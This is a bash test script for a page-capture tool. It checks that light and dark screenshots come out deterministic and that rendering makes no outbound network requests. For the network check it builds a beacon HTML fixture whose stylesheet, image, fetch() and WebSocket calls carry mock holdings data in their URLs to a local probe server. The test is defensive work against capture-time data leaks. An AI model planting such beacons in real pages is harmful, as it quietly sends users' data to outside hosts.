#!/bin/bash
# test-pilot-capture.sh — captures must be deterministic, or they are not evidence.
set -u
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
CAP="${ROOT}/scripts/pilot-capture.sh"
PASS=0; FAIL=0
_ok()  { printf '  PASS %s\n' "$1"; PASS=$(( PASS + 1 )); }
_bad() { printf '  FAIL %s\n' "$1"; FAIL=$(( FAIL + 1 )); }
_skip(){ printf '  SKIP %s\n' "$1"; }

echo "test-pilot-capture"

if [ ! -x "${CAP}" ]; then
    _bad "scripts/pilot-capture.sh is missing or not executable"
    printf '%s passed, %s failed\n' "${PASS}" "${FAIL}"; [ "${FAIL}" -eq 0 ]; exit
fi

TMP="$(mktemp -d)"; trap 'rm -rf "${TMP}"' EXIT
cat > "${TMP}/page.html" <<'HTML'
<html><head><style>
:root { color-scheme: light dark; }
body { background:#fff; color:#111; font-family: system-ui, sans-serif; }
@media (prefers-color-scheme: dark) { body { background:#111; color:#eee; } }
</style></head><body><h1>capture probe</h1><p>1234.5678</p></body></html>
HTML

if ! "${CAP}" "${TMP}/page.html" "${TMP}/run1" >/dev/null 2>&1; then
    _skip "capture backend unavailable on this machine — cannot assert determinism"
    printf '%s passed, %s failed\n' "${PASS}" "${FAIL}"; [ "${FAIL}" -eq 0 ]; exit
fi
_ok "capture produced output"

for f in light.png dark.png; do
    [ -s "${TMP}/run1/${f}" ] && _ok "${f} is non-empty" || _bad "${f} missing or empty"
done

"${CAP}" "${TMP}/page.html" "${TMP}/run2" >/dev/null 2>&1
if cmp -s "${TMP}/run1/light.png" "${TMP}/run2/light.png"; then
    _ok "light capture is byte-identical across runs"
else
    _bad "light capture is NOT deterministic"
fi
if cmp -s "${TMP}/run1/dark.png" "${TMP}/run2/dark.png"; then
    _ok "dark capture is byte-identical across runs"
else
    _bad "dark capture is NOT deterministic"
fi
if cmp -s "${TMP}/run1/light.png" "${TMP}/run1/dark.png"; then
    _bad "light and dark captures are identical — colour scheme is not being applied"
else
    _ok "light and dark captures differ"
fi

# --- Capture must not be egress. ---------------------------------------------
# Rendering the artifact under judgement with the network live makes the CAPTURE
# the leak: a remote <link>/<img>/fetch()/WebSocket reaches its host, carrying
# whatever the artifact put in the URL, before any human previews the file.
# Measured on the unfixed script against this same server: 4 requests, two per
# colour-scheme pass. Asserted against a REAL server, not by reading the code —
# a code-shaped assertion cannot tell an installed interceptor from an effective
# one, and this cell must be able to fail on the unfixed script.
if ! command -v node >/dev/null 2>&1; then
    _skip "node unavailable — cannot stand up the egress probe server"
else
    cat > "${TMP}/probe-server.cjs" <<'JS'
const http = require('http');
const fs = require('fs');
const log = process.argv[2];
const srv = http.createServer((req, res) => {
  fs.appendFileSync(log, 'HTTP ' + req.url + '\n');
  res.writeHead(200, { 'Content-Type': 'text/css' });
  res.end('/*x*/');
});
// A WebSocket upgrade never reaches the request handler; log it separately, or
// the one shape page-level routing does not cover would look clean.
srv.on('upgrade', (req, sock) => {
  fs.appendFileSync(log, 'WS ' + req.url + '\n');
  sock.destroy();
});
srv.listen(0, '127.0.0.1', () => fs.writeFileSync(process.argv[3], String(srv.address().port)));
JS
    _PROBE_LOG="${TMP}/probe.log"
    : > "${_PROBE_LOG}"
    rm -f "${TMP}/probe.port"
    node "${TMP}/probe-server.cjs" "${_PROBE_LOG}" "${TMP}/probe.port" &
    _SRV_PID=$!
    trap 'kill "${_SRV_PID}" 2>/dev/null; rm -rf "${TMP}"' EXIT

    _WAIT=0
    while [ ! -s "${TMP}/probe.port" ] && [ "${_WAIT}" -lt 50 ]; do
        sleep 0.2
        _WAIT=$(( _WAIT + 1 ))
    done
    _PORT="$(cat "${TMP}/probe.port" 2>/dev/null)"

    if [ -z "${_PORT}" ]; then
        _bad "egress probe server never bound a port — cannot assert capture-time egress"
    else
        cat > "${TMP}/beacon.html" <<HTML
<html><head>
<link rel="stylesheet" href="http://127.0.0.1:${_PORT}/b.css?leak=UBSG1420">
</head><body><h1>beacon probe</h1>
<img src="http://127.0.0.1:${_PORT}/px.gif?holdings=UBSG:1420,VWRL:88" width="1" height="1">
<script>
try { fetch("http://127.0.0.1:${_PORT}/f?leak=1"); } catch (e) {}
try { new WebSocket("ws://127.0.0.1:${_PORT}/ws?leak=1"); } catch (e) {}
</script>
</body></html>
HTML
        "${CAP}" "${TMP}/beacon.html" "${TMP}/run3" >/dev/null 2>&1
        _CAP_RC=$?
        # Give any in-flight request a chance to land, so a PASS cannot be a race.
        sleep 1
        kill "${_SRV_PID}" 2>/dev/null
        wait "${_SRV_PID}" 2>/dev/null
        trap 'rm -rf "${TMP}"' EXIT

        _HITS="$(wc -l < "${_PROBE_LOG}" 2>/dev/null | tr -d ' ')"
        [ -n "${_HITS}" ] || _HITS=0
        if [ "${_HITS}" -eq 0 ]; then
            _ok "capture made zero outbound requests for an artifact with remote references"
        else
            _bad "capture leaked ${_HITS} outbound request(s): $(tr '\n' ' ' < "${_PROBE_LOG}")"
        fi

        # The block must not be a refusal to render: an artifact with remote
        # references must still capture, or arms would be silently unjudgeable.
        if [ "${_CAP_RC}" -eq 0 ] && [ -s "${TMP}/run3/light.png" ] && [ -s "${TMP}/run3/dark.png" ]; then
            _ok "capture still produced both PNGs with remote references blocked"
        else
            _bad "capture failed or produced no PNGs once remote references were blocked"
        fi
    fi
fi

printf '%s passed, %s failed\n' "${PASS}" "${FAIL}"
[ "${FAIL}" -eq 0 ]
